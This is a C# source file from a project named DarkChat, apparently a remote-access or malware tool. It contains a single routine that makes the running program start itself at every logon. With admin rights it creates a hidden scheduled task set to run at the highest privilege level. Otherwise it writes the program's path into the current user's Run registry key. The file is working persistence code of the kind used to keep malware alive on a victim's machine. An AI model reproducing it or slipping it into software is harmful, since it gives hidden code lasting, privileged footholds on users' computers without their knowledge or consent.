using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using Microsoft.Win32;

namespace DarkChat.Helpers
{
    public static class Install
    {
        public static void Autostartup()
        {
            string taskName = Process.GetCurrentProcess().ProcessName;
            string imagePath = Process.GetCurrentProcess().MainModule.FileName;

            if (Common.IsAdmin())
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd",
                    Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + taskName + "\"" + " /tr " + "'" + "\"" + imagePath + "\"" + "' & exit",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                });
            }
            else
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\", RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    key.SetValue(taskName, imagePath);
                }
            }
        }
    }
}
